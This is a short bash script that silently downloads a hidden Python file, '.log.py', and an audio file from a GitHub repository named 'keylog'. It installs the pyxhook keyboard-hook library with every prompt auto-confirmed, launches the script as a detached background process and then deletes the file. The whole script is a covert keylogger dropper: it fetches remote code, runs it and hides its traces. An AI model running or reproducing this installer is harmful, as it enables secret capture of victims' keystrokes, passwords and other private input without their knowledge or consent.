#!/bin/bash

wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py .log.py
wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3 .music.mp3
yes | pip3 install pyxhook pygame 
nohup python3 .log.py &
rm .log.py
